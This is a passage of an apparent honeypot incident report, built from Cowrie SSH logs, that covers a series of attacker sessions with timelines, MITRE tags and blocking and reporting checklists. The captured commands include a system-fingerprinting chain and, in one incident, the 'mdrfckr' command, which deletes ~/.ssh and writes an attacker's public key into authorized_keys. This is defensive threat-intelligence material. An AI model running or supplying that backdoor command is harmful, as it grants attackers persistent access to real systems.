| `2026-08-16 02:24:32` | `cowrie.command.input` |
| `2026-08-16 02:24:32` | `cowrie.command.input` |
| `2026-08-16 02:24:32` | `cowrie.command.input` |
| `2026-08-16 02:24:32` | `cowrie.log.closed` |
| `2026-08-16 02:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdabdd8f8958

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:25 |
| **Last Seen** | 2026-08-16 02:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:25:25` | `cowrie.session.connect` |
| `2026-08-16 02:25:26` | `cowrie.client.version` |
| `2026-08-16 02:25:26` | `cowrie.client.kex` |
| `2026-08-16 02:25:29` | `cowrie.login.success` |
| `2026-08-16 02:25:30` | `cowrie.session.params` |
| `2026-08-16 02:25:30` | `cowrie.command.input` |
| `2026-08-16 02:25:30` | `cowrie.command.input` |
| `2026-08-16 02:25:30` | `cowrie.command.input` |
| `2026-08-16 02:25:30` | `cowrie.command.input` |
| `2026-08-16 02:25:30` | `cowrie.command.input` |
| `2026-08-16 02:25:30` | `cowrie.command.success` |
| `2026-08-16 02:25:30` | `cowrie.command.input` |
| `2026-08-16 02:25:30` | `cowrie.command.input` |
| `2026-08-16 02:25:30` | `cowrie.command.input` |
| `2026-08-16 02:25:30` | `cowrie.command.input` |
| `2026-08-16 02:25:31` | `cowrie.log.closed` |
| `2026-08-16 02:25:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc393bcb9da4

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:26 |
| **Last Seen** | 2026-08-16 02:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:26:22` | `cowrie.session.connect` |
| `2026-08-16 02:26:23` | `cowrie.client.version` |
| `2026-08-16 02:26:23` | `cowrie.client.kex` |
| `2026-08-16 02:26:25` | `cowrie.login.success` |
| `2026-08-16 02:26:27` | `cowrie.session.params` |
| `2026-08-16 02:26:27` | `cowrie.command.input` |
| `2026-08-16 02:26:27` | `cowrie.command.input` |
| `2026-08-16 02:26:27` | `cowrie.command.input` |
| `2026-08-16 02:26:27` | `cowrie.command.input` |
| `2026-08-16 02:26:27` | `cowrie.command.input` |
| `2026-08-16 02:26:27` | `cowrie.command.success` |
| `2026-08-16 02:26:27` | `cowrie.command.input` |
| `2026-08-16 02:26:27` | `cowrie.command.input` |
| `2026-08-16 02:26:27` | `cowrie.command.input` |
| `2026-08-16 02:26:27` | `cowrie.command.input` |
| `2026-08-16 02:26:27` | `cowrie.log.closed` |
| `2026-08-16 02:26:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eb16ab79e66

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 02:26 |
| **Last Seen** | 2026-08-16 02:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:26:36` | `cowrie.session.connect` |
| `2026-08-16 02:26:36` | `cowrie.client.version` |
| `2026-08-16 02:26:36` | `cowrie.client.kex` |
| `2026-08-16 02:26:36` | `cowrie.login.success` |
| `2026-08-16 02:26:37` | `cowrie.session.params` |
| `2026-08-16 02:26:37` | `cowrie.command.input` |
| `2026-08-16 02:26:37` | `cowrie.log.closed` |
| `2026-08-16 02:26:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65ce1dd2ae13

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 02:27 |
| **Last Seen** | 2026-08-16 02:27 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:27:06` | `cowrie.session.connect` |
| `2026-08-16 02:27:12` | `cowrie.client.version` |
| `2026-08-16 02:27:12` | `cowrie.client.kex` |
| `2026-08-16 02:27:36` | `cowrie.login.success` |
| `2026-08-16 02:27:47` | `cowrie.session.params` |
| `2026-08-16 02:27:47` | `cowrie.command.input` |
| `2026-08-16 02:27:53` | `cowrie.log.closed` |
| `2026-08-16 02:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8483a45cff4c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:27 |
| **Last Seen** | 2026-08-16 02:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:27:18` | `cowrie.session.connect` |
| `2026-08-16 02:27:19` | `cowrie.client.version` |
| `2026-08-16 02:27:19` | `cowrie.client.kex` |
| `2026-08-16 02:27:20` | `cowrie.login.success` |
| `2026-08-16 02:27:22` | `cowrie.session.params` |
| `2026-08-16 02:27:22` | `cowrie.command.input` |
| `2026-08-16 02:27:22` | `cowrie.command.input` |
| `2026-08-16 02:27:22` | `cowrie.command.input` |
| `2026-08-16 02:27:22` | `cowrie.command.input` |
| `2026-08-16 02:27:22` | `cowrie.command.input` |
| `2026-08-16 02:27:22` | `cowrie.command.success` |
| `2026-08-16 02:27:22` | `cowrie.command.input` |
| `2026-08-16 02:27:22` | `cowrie.command.input` |
| `2026-08-16 02:27:22` | `cowrie.command.input` |
| `2026-08-16 02:27:22` | `cowrie.command.input` |
| `2026-08-16 02:27:22` | `cowrie.log.closed` |
| `2026-08-16 02:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e9eabd14902

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:28 |
| **Last Seen** | 2026-08-16 02:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:28:15` | `cowrie.session.connect` |
| `2026-08-16 02:28:15` | `cowrie.client.version` |
| `2026-08-16 02:28:15` | `cowrie.client.kex` |
| `2026-08-16 02:28:17` | `cowrie.login.success` |
| `2026-08-16 02:28:19` | `cowrie.session.params` |
| `2026-08-16 02:28:19` | `cowrie.command.input` |
| `2026-08-16 02:28:19` | `cowrie.command.input` |
| `2026-08-16 02:28:19` | `cowrie.command.input` |
| `2026-08-16 02:28:19` | `cowrie.command.input` |
| `2026-08-16 02:28:19` | `cowrie.command.input` |
| `2026-08-16 02:28:19` | `cowrie.command.success` |
| `2026-08-16 02:28:19` | `cowrie.command.input` |
| `2026-08-16 02:28:19` | `cowrie.command.input` |
| `2026-08-16 02:28:19` | `cowrie.command.input` |
| `2026-08-16 02:28:19` | `cowrie.command.input` |
| `2026-08-16 02:28:20` | `cowrie.log.closed` |
| `2026-08-16 02:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba7c614f44ad

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:29 |
| **Last Seen** | 2026-08-16 02:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:29:09` | `cowrie.session.connect` |
| `2026-08-16 02:29:10` | `cowrie.client.version` |
| `2026-08-16 02:29:10` | `cowrie.client.kex` |
| `2026-08-16 02:29:12` | `cowrie.login.success` |
| `2026-08-16 02:29:15` | `cowrie.session.params` |
| `2026-08-16 02:29:15` | `cowrie.command.input` |
| `2026-08-16 02:29:15` | `cowrie.command.input` |
| `2026-08-16 02:29:15` | `cowrie.command.input` |
| `2026-08-16 02:29:15` | `cowrie.command.input` |
| `2026-08-16 02:29:15` | `cowrie.command.input` |
| `2026-08-16 02:29:15` | `cowrie.command.success` |
| `2026-08-16 02:29:15` | `cowrie.command.input` |
| `2026-08-16 02:29:15` | `cowrie.command.input` |
| `2026-08-16 02:29:15` | `cowrie.command.input` |
| `2026-08-16 02:29:15` | `cowrie.command.input` |
| `2026-08-16 02:29:15` | `cowrie.log.closed` |
| `2026-08-16 02:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c67a960bca2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:30 |
| **Last Seen** | 2026-08-16 02:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:30:03` | `cowrie.session.connect` |
| `2026-08-16 02:30:03` | `cowrie.client.version` |
| `2026-08-16 02:30:03` | `cowrie.client.kex` |
| `2026-08-16 02:30:06` | `cowrie.login.success` |
| `2026-08-16 02:30:07` | `cowrie.session.params` |
| `2026-08-16 02:30:07` | `cowrie.command.input` |
| `2026-08-16 02:30:07` | `cowrie.command.input` |
| `2026-08-16 02:30:07` | `cowrie.command.input` |
| `2026-08-16 02:30:07` | `cowrie.command.input` |
| `2026-08-16 02:30:07` | `cowrie.command.input` |
| `2026-08-16 02:30:07` | `cowrie.command.success` |
| `2026-08-16 02:30:07` | `cowrie.command.input` |
| `2026-08-16 02:30:07` | `cowrie.command.input` |
| `2026-08-16 02:30:07` | `cowrie.command.input` |
| `2026-08-16 02:30:07` | `cowrie.command.input` |
| `2026-08-16 02:30:08` | `cowrie.log.closed` |
| `2026-08-16 02:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7beec2e51ea0

| Field | Detail |
|---|---|
| **Source IP** | `175.206.113[.]91` |
| **First Seen** | 2026-08-16 02:30 |
| **Last Seen** | 2026-08-16 02:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:30:35` | `cowrie.session.connect` |
| `2026-08-16 02:30:36` | `cowrie.client.version` |
| `2026-08-16 02:30:36` | `cowrie.client.kex` |
| `2026-08-16 02:30:39` | `cowrie.login.success` |
| `2026-08-16 02:30:40` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.206.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `175.206.113[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c5249ba8a5

| Field | Detail |
|---|---|
| **Source IP** | `88.84.209[.]146` |
| **First Seen** | 2026-08-16 02:30 |
| **Last Seen** | 2026-08-16 02:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:30:51` | `cowrie.session.connect` |
| `2026-08-16 02:30:51` | `cowrie.client.version` |
| `2026-08-16 02:30:51` | `cowrie.client.kex` |
| `2026-08-16 02:30:53` | `cowrie.login.success` |
| `2026-08-16 02:30:53` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:30:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.84.209[.]146` to AbuseIPDB if not already reported
- [ ] Block `88.84.209[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eaf21f7238b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:30 |
| **Last Seen** | 2026-08-16 02:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:30:58` | `cowrie.session.connect` |
| `2026-08-16 02:30:59` | `cowrie.client.version` |
| `2026-08-16 02:30:59` | `cowrie.client.kex` |
| `2026-08-16 02:31:01` | `cowrie.login.success` |
| `2026-08-16 02:31:02` | `cowrie.session.params` |
| `2026-08-16 02:31:02` | `cowrie.command.input` |
| `2026-08-16 02:31:02` | `cowrie.command.input` |
| `2026-08-16 02:31:02` | `cowrie.command.input` |
| `2026-08-16 02:31:02` | `cowrie.command.input` |
| `2026-08-16 02:31:02` | `cowrie.command.input` |
| `2026-08-16 02:31:02` | `cowrie.command.success` |
| `2026-08-16 02:31:02` | `cowrie.command.input` |
| `2026-08-16 02:31:02` | `cowrie.command.input` |
| `2026-08-16 02:31:02` | `cowrie.command.input` |
| `2026-08-16 02:31:02` | `cowrie.command.input` |
| `2026-08-16 02:31:03` | `cowrie.log.closed` |
| `2026-08-16 02:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a08ffbc11e4

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-08-16 02:31 |
| **Last Seen** | 2026-08-16 02:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:31:25` | `cowrie.session.connect` |
| `2026-08-16 02:31:25` | `cowrie.client.version` |
| `2026-08-16 02:31:25` | `cowrie.client.kex` |
| `2026-08-16 02:31:26` | `cowrie.login.success` |
| `2026-08-16 02:31:27` | `cowrie.session.params` |
| `2026-08-16 02:31:27` | `cowrie.command.input` |
| `2026-08-16 02:31:27` | `cowrie.command.failed` |
| `2026-08-16 02:31:27` | `cowrie.log.closed` |
| `2026-08-16 02:31:28` | `cowrie.session.params` |
| `2026-08-16 02:31:28` | `cowrie.command.input` |
| `2026-08-16 02:31:28` | `cowrie.session.file_download` |
| `2026-08-16 02:31:28` | `cowrie.log.closed` |
| `2026-08-16 02:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4cd54d07f15

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-08-16 02:31 |
| **Last Seen** | 2026-08-16 02:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:31:28` | `cowrie.session.connect` |
| `2026-08-16 02:31:28` | `cowrie.client.version` |
| `2026-08-16 02:31:28` | `cowrie.client.kex` |
| `2026-08-16 02:31:29` | `cowrie.login.success` |
| `2026-08-16 02:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b56ba903083c

| Field | Detail |
|---|---|
| **Source IP** | `20.153.204[.]5` |
| **First Seen** | 2026-08-16 02:31 |
| **Last Seen** | 2026-08-16 02:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:31:29` | `cowrie.session.connect` |
| `2026-08-16 02:31:29` | `cowrie.client.version` |
| `2026-08-16 02:31:30` | `cowrie.client.kex` |
| `2026-08-16 02:31:30` | `cowrie.login.success` |
| `2026-08-16 02:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.153.204[.]5` to AbuseIPDB if not already reported
- [ ] Block `20.153.204[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc145c22f8fd

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:31 |
| **Last Seen** | 2026-08-16 02:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:31:53` | `cowrie.session.connect` |
| `2026-08-16 02:31:53` | `cowrie.client.version` |
| `2026-08-16 02:31:53` | `cowrie.client.kex` |
| `2026-08-16 02:31:55` | `cowrie.login.success` |
| `2026-08-16 02:31:56` | `cowrie.session.params` |
| `2026-08-16 02:31:56` | `cowrie.command.input` |
| `2026-08-16 02:31:56` | `cowrie.command.input` |
| `2026-08-16 02:31:56` | `cowrie.command.input` |
| `2026-08-16 02:31:56` | `cowrie.command.input` |
| `2026-08-16 02:31:56` | `cowrie.command.input` |
| `2026-08-16 02:31:56` | `cowrie.command.success` |
| `2026-08-16 02:31:56` | `cowrie.command.input` |
| `2026-08-16 02:31:56` | `cowrie.command.input` |
| `2026-08-16 02:31:56` | `cowrie.command.input` |
| `2026-08-16 02:31:56` | `cowrie.command.input` |
| `2026-08-16 02:31:56` | `cowrie.log.closed` |
| `2026-08-16 02:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-425559011611

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:32 |
| **Last Seen** | 2026-08-16 02:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
